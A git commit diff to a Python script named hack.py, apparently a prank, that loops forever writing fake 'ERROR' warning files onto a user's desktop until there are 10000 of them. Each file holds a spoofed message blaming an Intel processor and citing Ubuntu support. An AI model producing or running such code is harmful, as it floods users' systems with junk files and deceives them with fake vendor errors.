cf70bc4c425590a83fd625e5eb1564c432d272cd
viniciusvidal2 <vinicius.vidal@engenharia.ufjf.br>
2017-11-25 18:58:49 -0200

    vamos hackear

--- hack.py
+++ hack.py
@@ -4,12 +4,12 @@ import os
 from random import randint
 
 os.chdir("/home/vinicius/Desktop")
-quant = 20
+quant = 10000
 
 while True:
     n = os.listdir(".")
     if len(n) < quant:
         error = randint(0, 10000)
-        f = open("ERROR"+str(error)+".warn", "w")
+        f = open("ERROR_"+str(error)+".warn", "w")
         f.write("This is an error generated due to @INTEL processor version. Please refer to our documentation at https://www.ubuntu.com/support for solutions on this problem.")
         f.write("Error number: "+str(error))
